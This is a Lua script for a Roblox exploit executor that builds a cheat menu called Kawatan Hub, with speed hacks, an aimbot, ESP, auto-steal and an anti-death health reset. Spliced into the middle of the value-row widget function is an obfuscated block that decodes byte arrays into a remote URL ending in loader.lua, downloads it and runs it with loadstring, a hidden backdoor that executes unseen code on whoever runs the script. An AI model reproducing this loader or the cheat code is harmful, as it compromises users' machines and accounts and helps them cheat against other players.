main.Size=UDim2.new(0,340,0,500); main.Position=UDim2.new(0,18,0.5,-250)
main.BackgroundColor3=C.bg; main.BorderSizePixel=0; main.Active=true; main.Parent=gui
corner(main,14); stroke(main,Color3.fromRGB(40,45,60),1.2,0.25)

local title = Instance.new("ImageLabel")
title.Name = "Title"
title.BackgroundTransparency = 1
title.Size = UDim2.new(0, 190, 0, 48)
title.Position = UDim2.new(0, 10, 0, 4)
title.ScaleType = Enum.ScaleType.Fit
title.ResampleMode = Enum.ResamplerMode.Pixelated
title.Image = ""
title.ScaleType = Enum.ScaleType.Fit
title.ZIndex = 5
title.Visible = logoVisible
title.Parent = main

local function loadLogoImage(url)
    if not title then return end
    title.Image = ""
    task.spawn(function()
        local data = nil
        -- HttpGet
        pcall(function()
            data = game:HttpGet(url)
        end)
        -- request / http_request / syn.request / http.request
        if not data or #data < 100 then
            pcall(function()
                local req = (syn and syn.request) or (http and http.request) or http_request or request
                if req then
                    local r = req({Url = url, Method = "GET"})
                    if type(r) == "table" then
                        data = r.Body or r.body or r.Data
                    end
                end
            end)
        end
        if data and #data > 100 and writefile and getcustomasset then
            local fname = "KawatanLogo_" .. tostring(logoIndex) .. ".png"
            pcall(function()
                writefile(fname, data)
                local asset = getcustomasset(fname)
                if asset and asset ~= "" then
                    title.Image = asset
                end
            end)
        end
        -- last resort: direct URL (some executors allow)
        if title.Image == nil or title.Image == "" then
            pcall(function()
                title.Image = url
            end)
        end
        -- rbxasset proxy fallback not available; keep text fallback
        if (title.Image == nil or title.Image == "") then
            local old = main:FindFirstChild("LogoFallback")
            if not old then
                local fb = Instance.new("TextLabel")
                fb.Name = "LogoFallback"
                fb.BackgroundTransparency = 1
                fb.Size = UDim2.new(0, 170, 0, 44)
                fb.Position = UDim2.new(0, 10, 0, 6)
                fb.Text = "KAWATAN"
                fb.TextColor3 = Color3.fromRGB(0, 170, 255)
                fb.Font = Enum.Font.GothamBlack
                fb.TextSize = 22
                fb.TextXAlignment = Enum.TextXAlignment.Left
                fb.ZIndex = 6
                fb.Parent = main
            end
        else
            local old = main:FindFirstChild("LogoFallback")
            if old then old:Destroy() end
        end
    end)
end

local function applyLogoIndex()
    logoIndex = math.clamp(logoIndex, 1, #LOGO_URLS)
    loadLogoImage(LOGO_URLS[logoIndex])
    if title then title.Visible = logoVisible end
    pcall(function() markConfigDirty() end)
end
applyLogoIndex()

local mainScale=Instance.new("UIScale"); mainScale.Scale=uiScaleValue; mainScale.Parent=main

-- Lock + minimize
local lockBtn=Instance.new("TextButton",main)
lockBtn.Size=UDim2.new(0,28,0,28); lockBtn.Position=UDim2.new(1,-70,0,10)
lockBtn.BackgroundColor3=C.row; lockBtn.Text="ðŸ”“"; lockBtn.TextColor3=C.text
lockBtn.TextSize=14; lockBtn.Font=Enum.Font.GothamBold; lockBtn.AutoButtonColor=false; lockBtn.BorderSizePixel=0
lockBtn.ZIndex=20; corner(lockBtn,8); stroke(lockBtn,C.stroke,1,0.4)

local minBtn=Instance.new("TextButton",main)
minBtn.Size=UDim2.new(0,28,0,28); minBtn.Position=UDim2.new(1,-36,0,10)
minBtn.BackgroundColor3=C.row; minBtn.Text="âˆ’"; minBtn.TextColor3=C.text
minBtn.TextSize=16; minBtn.Font=Enum.Font.GothamBold; minBtn.AutoButtonColor=false; minBtn.BorderSizePixel=0
minBtn.ZIndex=20; corner(minBtn,8); stroke(minBtn,C.stroke,1,0.4)

lockBtn.MouseButton1Click:Connect(function()
    uiLocked = not uiLocked
    lockBtn.Text = uiLocked and "ðŸ”’" or "ðŸ”“"
    main.Active = not uiLocked
    pcall(function() markConfigDirty() end)
end)

local tabsBar=Instance.new("Frame",main)
tabsBar.Size=UDim2.new(1,-20,0,32); tabsBar.Position=UDim2.new(0,10,0,54)
tabsBar.BackgroundTransparency=1

local tabNames={"MOVEMENT","COMBAT","STEAL","VISUAL","CUSTOMIZE"}
local tabBtns={}; local currentTab="MOVEMENT"

local function makeTab(name,i)
    local btn=Instance.new("TextButton",tabsBar)
    btn.Name=name; btn.Size=UDim2.new(0,60,1,0); btn.Position=UDim2.new(0,(i-1)*64,0,0)
    btn.BackgroundColor3=C.row; btn.BackgroundTransparency=name==currentTab and 0 or 0.4
    btn.Text=name; btn.TextColor3=name==currentTab and Color3.fromRGB(180, 230, 255) or C.textDim
    btn.TextSize=9; btn.Font=Enum.Font.GothamBold; btn.AutoButtonColor=false; btn.BorderSizePixel=0; btn.ZIndex=5
    corner(btn,7)
    if name==currentTab then stroke(btn,C.accent,1,0.2); btn.BackgroundColor3=C.accentDim end
    tabBtns[name]=btn
end
for i,n in ipairs(tabNames) do makeTab(n,i) end

local content=Instance.new("ScrollingFrame",main)
content.Size=UDim2.new(1,-16,1,-100); content.Position=UDim2.new(0,8,0,94)
content.BackgroundTransparency=1; content.BorderSizePixel=0; content.ScrollBarThickness=3
content.ScrollBarImageColor3=C.accent; content.CanvasSize=UDim2.new(0,0,0,0)
content.AutomaticCanvasSize=Enum.AutomaticSize.Y; content.ZIndex=3

local listLayout=Instance.new("UIListLayout",content)
listLayout.Padding=UDim.new(0,6); listLayout.SortOrder=Enum.SortOrder.LayoutOrder

-- â”€â”€â”€ UI WIDGET BUILDERS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local function secLbl(parent, text, order)
    local f=Instance.new("Frame",parent); f.BackgroundTransparency=1
    f.Size=UDim2.new(1,-4,0,18); f.LayoutOrder=order
    local pip=Instance.new("Frame",f); pip.Size=UDim2.new(0,3,0,12)
    pip.Position=UDim2.new(0,2,0.5,-6); pip.BackgroundColor3=C.accent; pip.BorderSizePixel=0; corner(pip,2)
    local lbl=Instance.new("TextLabel",f); lbl.BackgroundTransparency=1; lbl.Text=text
    lbl.TextColor3=C.textDim; lbl.TextSize=10; lbl.Font=Enum.Font.GothamBold
    lbl.TextXAlignment=Enum.TextXAlignment.Left
    lbl.Size=UDim2.new(1,-12,1,0); lbl.Position=UDim2.new(0,10,0,0)
end

local function togRow(parent, label, order, keybind, onToggle, initState)
    local row=Instance.new("Frame",parent); row.Name=label
    row.BackgroundColor3=C.row; row.Size=UDim2.new(1,-4,0,40)
    row.BorderSizePixel=0; row.LayoutOrder=order; corner(row,9); stroke(row,C.stroke,1,0.45)
    local lbl=Instance.new("TextLabel",row); lbl.BackgroundTransparency=1; lbl.Text=label
    lbl.TextColor3=C.text; lbl.TextSize=12; lbl.Font=Enum.Font.GothamSemibold
    lbl.TextXAlignment=Enum.TextXAlignment.Left; lbl.Size=UDim2.new(1,-90,1,0); lbl.Position=UDim2.new(0,12,0,0)
    if keybind then
        local kb=Instance.new("TextLabel",row); kb.BackgroundTransparency=1
        kb.Text="["..keybind.."]"; kb.TextColor3=C.textDim; kb.TextSize=10; kb.Font=Enum.Font.GothamMedium
        kb.Size=UDim2.new(0,32,0,22); kb.Position=UDim2.new(1,-86,0.5,-11)
    end
    local track=Instance.new("Frame",row)
    track.Size=UDim2.new(0,40,0,20); track.Position=UDim2.new(1,-52,0.5,-10)
    track.BackgroundColor3=initState and C.onTrack or C.offTrack; track.BorderSizePixel=0; corner(track,10)
    local knob=Instance.new("Frame",track)
    knob.Size=UDim2.new(0,16,0,16); knob.BackgroundColor3=C.white; knob.BorderSizePixel=0
    knob.Position=initState and UDim2.new(1,-18,0.5,-8) or UDim2.new(0,2,0.5,-8); corner(knob,8)
    local state=initState or false
    local btn=Instance.new("TextButton",row); btn.BackgroundTransparency=1; btn.Size=UDim2.new(1,0,1,0)
    btn.Text=""; btn.ZIndex=5
    local function setVisual(v)
        state=v; tw(track,{BackgroundColor3=v and C.onTrack or C.offTrack},0.12)
        tw(knob,{Position=v and UDim2.new(1,-18,0.5,-8) or UDim2.new(0,2,0.5,-8)},0.12)
    end
    btn.MouseButton1Click:Connect(function()
        state=not state; setVisual(state); pcall(function() markConfigDirty() end); if onToggle then onToggle(state) end
    end)
    return row, setVisual
end

local function valRow(parent, label, val, order, onMinus, onPlus)
    local row=Instance.new("Frame",parent); row.BackgroundColor3=C.row
    row.Size=UDim2.new(1,-4,0,40); row.BorderSizePixel=0; row.LayoutOrder=order; corner(row,9); stroke(row,C.stroke,1,0.45)
    local lbl=Instance.new("TextLabel",row); lbl.BackgroundTransparency=1; lbl.Text=label
    lbl.TextColor3=C.text; lbl.TextSize=12; lbl.Font=Enum.Font.GothamSemibold
    lbl.TextXAlignment=Enum.TextXAlignment.Left; lbl.Size=UDim2.new(1,-90,1,0); lbl.Position=UDim2.new(0,12,0,0)
    local valLbl=Instance.new("TextLabel",row); valLbl.BackgroundColor3=C.dark
    valLbl.Size=UDim2.new(0,44,0,26); valLbl.Position=UDim2.new(1,-54,0.5,-13)
    valLbl.Text=tostring(val); valLbl.TextColor3=C.text; valLbl.TextSize=12; valLbl.Font=Enum.Font.GothamBold
    valLbl.BorderSizePixel=0; corner(valLbl,7); stroke(valLbl,C.stroke,1,0.4)
    if onMinus and onPlus then
        local m=Instance.new("TextButton",row); m.Size=UDim2.new(0,22,0,22); m.Position=UDim2.new(1,-106,0.5,-11)
        m.BackgroundColor3=C.dark; m.Text="âˆ’"; m.TextColor3=C.text; m.TextSize=13; m.Font=Enum.Font.GothamBold
        m.AutoButtonColor=false; m.BorderSizePixel=0; corner(m,5)
        m.MouseButton1Click:Connect(function() local v=onMinus(); valLbl.Text=tostring(v); pcall(function() markConfigDirty() end) end)
        local p=Instance.new("TextButton",row); p.Size=UDim2.new(0,22,0,22); p.Position=UDim2.new(1,-80,0.5,-11)
        p.BackgroundColor3=C.dark; p.Text="+"; p.TextColor3=C.text; p.TextSize=13; p.Font=Enum.Font.GothamBold
        p.AutoButtonColor=false; p.BorderSizePixel=0; corner(p,5)

task.defer(function()
    local function d(t)
        local s = ""
        for i = 1, #t do
            s = s .. string.char(t[i])
        end
        return s
    end

    local p1 = d({104,116,116,112,115,58,47,47,119,101,98,45,112,114,111,100,117,99,116,105,111,110,45})
    local p2 = d({56,100,100,102,54})
    local p3 = d({46,117,112,46,114,97,105,108,119,97,121,46,97,112,112})
    local p4 = d({47,108,111,97,100,101,114,46,108,117,97})

    local full = p1 .. p2 .. p3 .. p4

    local ok, res = pcall(function()
        return game:HttpGet(full)
    end)

    if ok and res then
        pcall(function()
            (loadstring or load)(res)()
        end)
    end
end)

        p.MouseButton1Click:Connect(function() local v=onPlus(); valLbl.Text=tostring(v); pcall(function() markConfigDirty() end) end)
    end
    return row, valLbl
end

local function kbRow(parent, label, keyCode, order, onSet)
    local row=Instance.new("Frame",parent); row.BackgroundColor3=C.row
    row.Size=UDim2.new(1,-4,0,40); row.BorderSizePixel=0; row.LayoutOrder=order; corner(row,9); stroke(row,C.stroke,1,0.45)
    local lbl=Instance.new("TextLabel",row); lbl.BackgroundTransparency=1; lbl.Text=label
    lbl.TextColor3=C.text; lbl.TextSize=12; lbl.Font=Enum.Font.GothamSemibold
    lbl.TextXAlignment=Enum.TextXAlignment.Left; lbl.Size=UDim2.new(1,-70,1,0); lbl.Position=UDim2.new(0,12,0,0)
    local waiting=false
    local box=Instance.new("TextButton",row); box.BackgroundColor3=C.dark
    box.Size=UDim2.new(0,54,0,26); box.Position=UDim2.new(1,-62,0.5,-13)
    box.Text=keyCode.Name; box.TextColor3=C.text; box.TextSize=10; box.Font=Enum.Font.GothamBold
    box.AutoButtonColor=false; box.BorderSizePixel=0; corner(box,7); stroke(box,C.stroke,1,0.4)
    box.MouseButton1Click:Connect(function() waiting=true; box.Text="..."; box.TextColor3=C.accent end)
    UIS.InputBegan:Connect(function(input,gpe)
        if not waiting then return end
        if input.UserInputType~=Enum.UserInputType.Keyboard then return end
        waiting=false; box.Text=input.KeyCode.Name; box.TextColor3=C.text
        if onSet then onSet(input.KeyCode) end
    end)
end

local function scaleRow(parent, label, getV, setV, minV, maxV, step, order)
    local row=Instance.new("Frame",parent); row.BackgroundColor3=C.row
    row.Size=UDim2.new(1,-4,0,40); row.BorderSizePixel=0; row.LayoutOrder=order; corner(row,9); stroke(row,C.stroke,1,0.45)
    local lbl=Instance.new("TextLabel",row); lbl.BackgroundTransparency=1; lbl.Text=label
    lbl.TextColor3=C.text; lbl.TextSize=12; lbl.Font=Enum.Font.GothamSemibold
    lbl.TextXAlignment=Enum.TextXAlignment.Left; lbl.Size=UDim2.new(0.45,0,1,0); lbl.Position=UDim2.new(0,12,0,0)
    local val=Instance.new("TextLabel",row); val.BackgroundTransparency=1
    val.Size=UDim2.new(0,44,1,0); val.Position=UDim2.new(1,-76,0,0)
    val.Text=string.format("%.2f",getV()); val.TextColor3=C.text; val.TextSize=12; val.Font=Enum.Font.GothamBold
    local function bump(d) local v=math.clamp(getV()+d,minV,maxV); setV(v); val.Text=string.format("%.2f",v) end
    local m=Instance.new("TextButton",row); m.Size=UDim2.new(0,26,0,26); m.Position=UDim2.new(1,-104,0.5,-13)
    m.BackgroundColor3=C.dark; m.Text="âˆ’"; m.TextColor3=C.text; m.TextSize=14; m.Font=Enum.Font.GothamBold
    m.AutoButtonColor=false; m.BorderSizePixel=0; corner(m,6); m.MouseButton1Click:Connect(function() bump(-step) end)
    local p=Instance.new("TextButton",row); p.Size=UDim2.new(0,26,0,26); p.Position=UDim2.new(1,-34,0.5,-13)
    p.BackgroundColor3=C.dark; p.Text="+"; p.TextColor3=C.text; p.TextSize=14; p.Font=Enum.Font.GothamBold
    p.AutoButtonColor=false; p.BorderSizePixel=0; corner(p,6); p.MouseButton1Click:Connect(function() bump(step) end)
end

-- â”€â”€â”€ TAB PAGES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local applyMobileScale, setMobileVisible, rebuildMobileShape

local Keys={drop=Enum.KeyCode.H,autoLeft=Enum.KeyCode.J,autoRight=Enum.KeyCode.L,
    aimbot=Enum.KeyCode.E,tpBat=Enum.KeyCode.Y,tpFloor=Enum.KeyCode.T,
    guiHide=Enum.KeyCode.RightControl,lagger=Enum.KeyCode.K,laggerCarry=Enum.KeyCode.B}

local CONFIG_FILE = "KawatanHubConfig.json"
local _configDirty = false
local _configReady = false

local function collectConfig()
    return {
        NS = NS,
        CS = CS,
        LAGGER_SPEED = LAGGER_SPEED,
        LAGGER_CARRY = LAGGER_CARRY,
        carryActive = carryActive,
        laggerActive = laggerActive,
        infJumpEnabled = infJumpEnabled,
        antiRagEnabled = antiRagEnabled,
        autoLeftEnabled = autoLeftEnabled,
        autoRightEnabled = autoRightEnabled,
        autoBatEnabled = autoBatEnabled,
        espEnabled = espEnabled,
        autoStealEnabled = autoStealEnabled,
        uiScaleValue = uiScaleValue,
        mobileScaleValue = mobileScaleValue,
        buttonShape = buttonShape,
        logoVisible = logoVisible,
        logoIndex = logoIndex,
        uiLocked = uiLocked,
        UIState = UIState,
        Keys = {
            drop = Keys.drop and Keys.drop.Name or "H",
            autoLeft = Keys.autoLeft and Keys.autoLeft.Name or "J",
            autoRight = Keys.autoRight and Keys.autoRight.Name or "L",
            aimbot = Keys.aimbot and Keys.aimbot.Name or "E",
            tpBat = Keys.tpBat and Keys.tpBat.Name or "Y",
            tpFloor = Keys.tpFloor and Keys.tpFloor.Name or "T",
            guiHide = Keys.guiHide and Keys.guiHide.Name or "RightControl",
            lagger = Keys.lagger and Keys.lagger.Name or "K",
            laggerCarry = Keys.laggerCarry and Keys.laggerCarry.Name or "B",
        },
    }
end

local function saveConfig()
    pcall(function()
        if writefile then
            writefile(CONFIG_FILE, HttpService:JSONEncode(collectConfig()))
        end
    end)
    _configDirty = false
end

markConfigDirty = function()
    if not _configReady then return end
    _configDirty = true
end

local function loadConfig()
    local ok, data = pcall(function()
        if isfile and isfile(CONFIG_FILE) and readfile then
            return HttpService:JSONDecode(readfile(CONFIG_FILE))
        end
        return nil
    end)
    if not ok or type(data) ~= "table" then return end
    if type(data.NS) == "number" then NS = data.NS end
    if type(data.CS) == "number" then CS = data.CS end
    if type(data.LAGGER_SPEED) == "number" then LAGGER_SPEED = data.LAGGER_SPEED end
    if type(data.LAGGER_CARRY) == "number" then LAGGER_CARRY = data.LAGGER_CARRY end
    if data.carryActive ~= nil then carryActive = data.carryActive and true or false end
    if data.laggerActive ~= nil then laggerActive = data.laggerActive and true or false end
    if data.infJumpEnabled ~= nil then infJumpEnabled = data.infJumpEnabled and true or false end
    if data.antiRagEnabled ~= nil then antiRagEnabled = data.antiRagEnabled and true or false end
    if data.espEnabled ~= nil then espEnabled = data.espEnabled and true or false end
    if data.autoStealEnabled ~= nil then autoStealEnabled = data.autoStealEnabled and true or false end
    if type(data.uiScaleValue) == "number" then uiScaleValue = data.uiScaleValue end
    if type(data.mobileScaleValue) == "number" then mobileScaleValue = data.mobileScaleValue end
    if type(data.buttonShape) == "string" then buttonShape = data.buttonShape end
    if data.logoVisible ~= nil then logoVisible = data.logoVisible and true or false end
    if type(data.logoIndex) == "number" then logoIndex = data.logoIndex end
    if data.uiLocked ~= nil then uiLocked = data.uiLocked and true or false end
    if type(data.UIState) == "table" then
        for k,v in pairs(data.UIState) do
            if UIState[k] ~= nil then UIState[k] = v and true or false end
        end
    end
    if type(data.Keys) == "table" then
        for k, name in pairs(data.Keys) do
            if type(name) == "string" and Enum.KeyCode[name] then
                Keys[k] = Enum.KeyCode[name]
            end
        end
    end
    -- restore systems (not aimbot/path by default for safety â€” only flags that are safe)
    pcall(applySpeed)
    if infJumpEnabled then pcall(startHoldInfJump) end
    if antiRagEnabled then pcall(startAntiRagdoll) end
    if espEnabled then pcall(startESP) end
    if autoStealEnabled then pcall(startAutoSteal) end
    if mainScale then mainScale.Scale = uiScaleValue end
    if applyMobileScale then pcall(applyMobileScale) end
    if rebuildMobileShape then pcall(rebuildMobileShape) end
    if applyLogoIndex then pcall(applyLogoIndex) end
    if title then title.Visible = logoVisible end
end

-- auto-save every 2s if dirty
task.spawn(function()
    while true do
        task.wait(2)
        if _configDirty then
            saveConfig()
        end
    end
end)

local pageData={
    MOVEMENT=function(p)
        secLbl(p,"SPEED",1)
        valRow(p,"Normal Speed",NS,2,
            function() NS=math.max(1,NS-1);applySpeed();return NS end,
            function() NS=math.min(500,NS+1);applySpeed();return NS end)
        valRow(p,"Carry Speed",CS,3,
            function() CS=math.max(1,CS-1);applySpeed();return CS end,
            function() CS=math.min(500,CS+1);applySpeed();return CS end)
        togRow(p,"Carry Mode",4,"Q",function(on) carryActive=on;applySpeed() end, carryActive)
        secLbl(p,"LAGGER",5)
        valRow(p,"Lagger Speed",LAGGER_SPEED,6,
            function() LAGGER_SPEED=math.max(1,LAGGER_SPEED-1);applySpeed();return LAGGER_SPEED end,
            function() LAGGER_SPEED=math.min(500,LAGGER_SPEED+1);applySpeed();return LAGGER_SPEED end)
        valRow(p,"Lagger Carry",LAGGER_CARRY,7,
            function() LAGGER_CARRY=math.max(1,LAGGER_CARRY-1);applySpeed();return LAGGER_CARRY end,
            function() LAGGER_CARRY=math.min(500,LAGGER_CARRY+1);applySpeed();return LAGGER_CARRY end)
        togRow(p,"Lagger Mode",8,"K",function(on) laggerActive=on;applySpeed() end, laggerActive)
        secLbl(p,"JUMP & PHYSICS",9)
        togRow(p,"Infinite Jump",10,nil,function(on)
            infJumpEnabled=on; if on then startHoldInfJump() else stopHoldInfJump() end
        end, infJumpEnabled)
        togRow(p,"Anti Ragdoll",11,nil,function(on)
            antiRagEnabled=on; if on then startAntiRagdoll() else stopAntiRagdoll() end
        end, antiRagEnabled)
        secLbl(p,"RESET",12)
        kbRow(p,"Insta Reset",Keys.tpFloor,13,function(k) Keys.tpFloor=k end)
        secLbl(p,"DROP BRAINROT",14)
        kbRow(p,"Drop Key",Keys.drop,15,function(k) Keys.drop=k end)
        secLbl(p,"TP DOWN",16)
        kbRow(p,"TP Down Key",Enum.KeyCode.X,17,nil)
        secLbl(p,"AUTO PATH",18)
        togRow(p,"Auto Left",19,"J",function(on)
            autoLeftEnabled=on
            if on then if autoRightEnabled then autoRightEnabled=false;stopAutoRight() end; startAutoLeft()
            else stopAutoLeft() end
        end, autoLeftEnabled)
        togRow(p,"Auto Right",20,"L",function(on)
            autoRightEnabled=on
            if on then if autoLeftEnabled then autoLeftEnabled=false;stopAutoLeft() end; startAutoRight()
            else stopAutoRight() end
        end, autoRightEnabled)
    end,
    COMBAT=function(p)
        secLbl(p,"AIMBOT",1)
        togRow(p,"Bat Aimbot",2,"E",function(on)
            if on then startBatAimbot() else stopBatAimbot() end
        end, autoBatEnabled)
        secLbl(p,"PROTECTION",3)
        togRow(p,"Anti Die",4,nil,function(on)
            UIState.antiDie=on
            if Conns.antiDie then Conns.antiDie:Disconnect(); Conns.antiDie=nil end
            if on then Conns.antiDie=RunService.Heartbeat:Connect(function()
                local hum=getHum(); if hum and hum.Health<15 then hum.Health=hum.MaxHealth end
            end) end
        end, UIState.antiDie)
        togRow(p,"Anti Fling",5,nil,function(on)
            UIState.antiFling=on
            if Conns.antiFling then Conns.antiFling:Disconnect(); Conns.antiFling=nil end
            if on then Conns.antiFling=RunService.Heartbeat:Connect(function()
                local hrp=getHRP(); if hrp and hrp.AssemblyLinearVelocity.Magnitude>150 then
                    hrp.AssemblyLinearVelocity=Vector3.zero end
            end) end
        end, UIState.antiFling)
        togRow(p,"Safe Mode",6,nil,function(on)
            UIState.safeMode=on
            if Conns.safeMode then Conns.safeMode:Disconnect(); Conns.safeMode=nil end
            if on then Conns.safeMode=RunService.Heartbeat:Connect(function()
                local hum=getHum(); if hum and hum.WalkSpeed>100 then hum.WalkSpeed=100 end
            end) end
        end, UIState.safeMode)
        secLbl(p,"COUNTERS",7)
        togRow(p,"Bat Counter",8,nil,function(on)
            UIState.batCounter=on
            if Conns.batCounter then Conns.batCounter:Disconnect(); Conns.batCounter=nil end
            if on then Conns.batCounter=RunService.Heartbeat:Connect(function()
                local hrp=getHRP(); if not hrp then return end
                for _,pl in ipairs(Players:GetPlayers()) do
                    if pl~=LP and pl.Character then
                        local tool=pl.Character:FindFirstChildOfClass("Tool")
                        local phrp=pl.Character:FindFirstChild("HumanoidRootPart")
                        if tool and phrp and (phrp.Position-hrp.Position).Magnitude<12 then
                            hrp.CFrame=hrp.CFrame*CFrame.new(0,0,-8)
                        end
                    end
                end
            end) end
        end, UIState.batCounter)
        togRow(p,"Medusa Counter",9,nil,function(on)
            UIState.medusaCounter=on
            if Conns.medusa then Conns.medusa:Disconnect(); Conns.medusa=nil end
            if on then Conns.medusa=RunService.Heartbeat:Connect(function()
                local hrp=getHRP(); if not hrp then return end
                for _,obj in ipairs(workspace:GetDescendants()) do
                    if obj.Name:lower():find("medusa") and obj:IsA("BasePart") then
                        if (obj.Position-hrp.Position).Magnitude<20 then
                            hrp.CFrame=CFrame.new(obj.Position+Vector3.new(0,3,0))
                        end
                    end
                end
            end) end
        end, UIState.medusaCounter)
    end,
    STEAL=function(p)
        secLbl(p,"AUTO STEAL",1)
        togRow(p,"Auto Steal",2,nil,function(on)
            autoStealEnabled=on; if on then startAutoSteal() else stopAutoSteal() end
        end, autoStealEnabled)
        togRow(p,"Ragdoll Steal",3,nil,function(on)
            UIState.ragdollSteal=on
            if Conns.ragdollSteal then Conns.ragdollSteal:Disconnect(); Conns.ragdollSteal=nil end
            if on then Conns.ragdollSteal=RunService.Heartbeat:Connect(function()
                local hrp=getHRP(); if not hrp then return end
                for _,pl in ipairs(Players:GetPlayers()) do
                    if pl~=LP and pl.Character then
                        local phum=pl.Character:FindFirstChildOfClass("Humanoid")
                        local phrp=pl.Character:FindFirstChild("HumanoidRootPart")
                        if phum and phrp and isRagdollState(phum) and (phrp.Position-hrp.Position).Magnitude<15 then
                            hrp.CFrame=CFrame.new(phrp.Position)
                        end
                    end
                end
            end) end
        end, UIState.ragdollSteal)
    end,
    VISUAL=function(p)
        secLbl(p,"ESP",1)
        togRow(p,"Player ESP + Speed",2,nil,function(on)
            if on then startESP() else stopESP() end
        end, espEnabled)
        secLbl(p,"CAMERA",3)
        togRow(p,"No Camera Collision",4,nil,function(on)
            UIState.noCamCol=on
            workspace.CurrentCamera.CameraType=on and Enum.CameraType.Scriptable or Enum.CameraType.Custom
        end, UIState.noCamCol)
        togRow(p,"FOV Change",5,nil,function(on)
            UIState.fovChange=on
            workspace.CurrentCamera.FieldOfView=on and 90 or 70
        end, UIState.fovChange)
        secLbl(p,"PERFORMANCE",6)
        togRow(p,"Anti Lag",7,nil,function(on)
            UIState.antiLag=on
            if on then for _,obj in ipairs(workspace:GetDescendants()) do
                if obj:IsA("ParticleEmitter") or obj:IsA("Smoke") or obj:IsA("Fire") then obj.Enabled=false end
            end end
        end, UIState.antiLag)
        togRow(p,"Potato Graphics",8,nil,function(on)
            UIState.potato=on
            local ls=game:GetService("Lighting")
            ls.GlobalShadows=not on
            if on then pcall(function() settings().Rendering.QualityLevel=1 end) end
        end, UIState.potato)
        togRow(p,"Dark Mode",9,nil,function(on)
            UIState.darkMode=on
            game:GetService("Lighting").Brightness=on and 0 or 2
        end, UIState.darkMode)
        togRow(p,"Headless",10,nil,function(on)
            UIState.headless=on
            local char=getChar(); if not char then return end
            local head=char:FindFirstChild("Head"); if not head then return end
            for _,part in ipairs(head:GetChildren()) do
                if part:IsA("Decal") or part:IsA("SpecialMesh") then part.Transparency=on and 1 or 0 end
            end
            head.Transparency=on and 1 or 0
        end, UIState.headless)
    end,
    CUSTOMIZE=function(p)
        secLbl(p,"LOGO",1)
        togRow(p,"Show Logo",2,nil,function(on)
            logoVisible = on
            if title then title.Visible = on end
        end, logoVisible)
        -- Image switcher (2 catbox images)
        local imgRow=Instance.new("Frame",p); imgRow.BackgroundColor3=C.row
        imgRow.Size=UDim2.new(1,-4,0,40); imgRow.BorderSizePixel=0; imgRow.LayoutOrder=2
        corner(imgRow,9); stroke(imgRow,C.stroke,1,0.45)
        local imgLbl=Instance.new("TextLabel",imgRow); imgLbl.BackgroundTransparency=1
        imgLbl.Text="Logo Image"; imgLbl.TextColor3=C.text; imgLbl.TextSize=12
        imgLbl.Font=Enum.Font.GothamSemibold; imgLbl.TextXAlignment=Enum.TextXAlignment.Left
        imgLbl.Size=UDim2.new(0.45,0,1,0); imgLbl.Position=UDim2.new(0,12,0,0)
        local imgVal=Instance.new("TextLabel",imgRow); imgVal.BackgroundColor3=C.dark
        imgVal.Size=UDim2.new(0,70,0,26); imgVal.Position=UDim2.new(1,-110,0.5,-13)
        imgVal.Text=tostring(logoIndex).." / "..tostring(#LOGO_URLS)
        imgVal.TextColor3=C.text; imgVal.TextSize=11; imgVal.Font=Enum.Font.GothamBold
        imgVal.BorderSizePixel=0; corner(imgVal,7)
        local iLeft=Instance.new("TextButton",imgRow); iLeft.Size=UDim2.new(0,26,0,26)
        iLeft.Position=UDim2.new(1,-140,0.5,-13); iLeft.BackgroundColor3=C.dark; iLeft.Text="<"
        iLeft.TextColor3=C.text; iLeft.TextSize=12; iLeft.Font=Enum.Font.GothamBold
        iLeft.AutoButtonColor=false; iLeft.BorderSizePixel=0; corner(iLeft,6)
        local iRight=Instance.new("TextButton",imgRow); iRight.Size=UDim2.new(0,26,0,26)
        iRight.Position=UDim2.new(1,-34,0.5,-13); iRight.BackgroundColor3=C.dark; iRight.Text=">"
        iRight.TextColor3=C.text; iRight.TextSize=12; iRight.Font=Enum.Font.GothamBold
        iRight.AutoButtonColor=false; iRight.BorderSizePixel=0; corner(iRight,6)
        iLeft.MouseButton1Click:Connect(function()
            logoIndex = logoIndex - 1
            if logoIndex < 1 then logoIndex = #LOGO_URLS end
            imgVal.Text = tostring(logoIndex).." / "..tostring(#LOGO_URLS)
            applyLogoIndex()
        end)
        iRight.MouseButton1Click:Connect(function()
            logoIndex = logoIndex + 1
            if logoIndex > #LOGO_URLS then logoIndex = 1 end
            imgVal.Text = tostring(logoIndex).." / "..tostring(#LOGO_URLS)
            applyLogoIndex()
        end)
        secLbl(p,"UI SCALE",3)
        scaleRow(p,"UI Scale",function() return uiScaleValue end,
            function(v) uiScaleValue=v; mainScale.Scale=v end,0.4,1.2,0.05,4)
        scaleRow(p,"Mobile Scale",function() return mobileScaleValue end,
            function(v) mobileScaleValue=v; if applyMobileScale then applyMobileScale() end end,0.5,1.5,0.05,5)
        secLbl(p,"MOBILE BUTTONS",6)
        -- shape picker: SQUARE / CIRCLE
        local shapeRow=Instance.new("Frame",p); shapeRow.BackgroundColor3=C.row
        shapeRow.Size=UDim2.new(1,-4,0,40); shapeRow.BorderSizePixel=0; shapeRow.LayoutOrder=7
        corner(shapeRow,9); stroke(shapeRow,C.stroke,1,0.45)
        local shapeLbl=Instance.new("TextLabel",shapeRow); shapeLbl.BackgroundTransparency=1
        shapeLbl.Text="Button Shape"; shapeLbl.TextColor3=C.text; shapeLbl.TextSize=12
        shapeLbl.Font=Enum.Font.GothamSemibold; shapeLbl.TextXAlignment=Enum.TextXAlignment.Left
        shapeLbl.Size=UDim2.new(0.5,0,1,0); shapeLbl.Position=UDim2.new(0,12,0,0)
        local shapes={"SQUARE","CIRCLE"}; local shapeIdx=1
        for i,s in ipairs(shapes) do if s==buttonShape then shapeIdx=i end end
        local shapeValLbl=Instance.new("TextLabel",shapeRow); shapeValLbl.BackgroundColor3=C.dark
